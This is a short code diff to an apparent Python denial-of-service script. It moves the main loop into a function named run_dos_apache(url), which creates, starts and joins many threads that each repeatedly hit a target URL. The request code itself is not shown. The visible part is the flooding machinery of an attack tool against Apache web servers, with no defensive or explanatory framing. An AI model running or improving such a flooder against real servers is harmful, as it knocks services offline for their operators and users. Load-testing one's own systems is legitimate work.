@@ -25,12 +25,22 @@ class MyThread(threading.Thread):
     def run(self):
         self.thread_function(self.nbr_iterations)
 
-# ----- Initial test to ensure everything is okay ----- #
+def run_dos_apache(url: str=URL_TO_GET):
+    global URL_TO_GET
+    URL_TO_GET = url
 
-MyThread.thread_function(1)  # Just to ensure that the config is okay
-print(f"Setup is okay, we now start the loop.")
+    # ----- Initial test to ensure everything is okay ----- #
 
-# ----- MAIN LOOP ----- #
+    MyThread.thread_function(1)  # Just to ensure that the config is okay
+    print(f"Setup is okay, we now start the loop.")
 
-for i in range(NUMBER_OF_THREADS):
-    MyThread(NUMBER_OF_ATTEMPTS).start()
+    # ----- MAIN LOOP ----- #
+
+    thread_list = [MyThread(NUMBER_OF_ATTEMPTS) for i in range(NUMBER_OF_THREADS)]
+    print(f"threads created. list size={len(thread_list)}")
+    [thread.start() for thread in thread_list]
+    print(f"threads started")
+    #[thread.join() for thread in thread_list]
+    for thread in thread_list:
+        thread.join()
+    print(f"threads joined")
